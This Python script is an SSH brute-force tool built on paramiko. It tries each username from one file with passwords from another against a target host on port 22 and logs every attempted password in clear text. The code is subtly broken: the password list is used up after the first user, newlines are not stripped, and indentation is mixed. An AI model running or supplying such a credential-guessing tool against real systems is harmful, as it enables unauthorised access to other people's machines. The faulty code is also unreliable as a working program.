import argparse
import paramiko
import socket
import os

import coloredlogs, logging


logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)


def connect_to_ssh(host,user,password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		logger.debug("Connecting to: " +host)
		logger.debug("Username :" +user+", Password : "+password)
		client.connect(host,22,user,password)
		logger.debug("Successfully connected!")

		return True
	except socket.error:
		logger.error("Computer is offline or port 22 is closed")
		return False
	except paramiko.ssh_exception.AuthenticationException:
		logger.error("Wrong Password or usersname")
		return False
	except paramiko.ssh_exception.SSHException:
		logger.error("No response from SSH server")
		return False

def brute_force_ssh(host,users_file,passwords_file):
    with open(users_file) as users:
        with open(passwords_file) as passwords:
            for user in users:
                for password in passwords:
                    connection = connect_to_ssh(host,user,password)
                    print(connection)
				
					
				
			
       
				
		


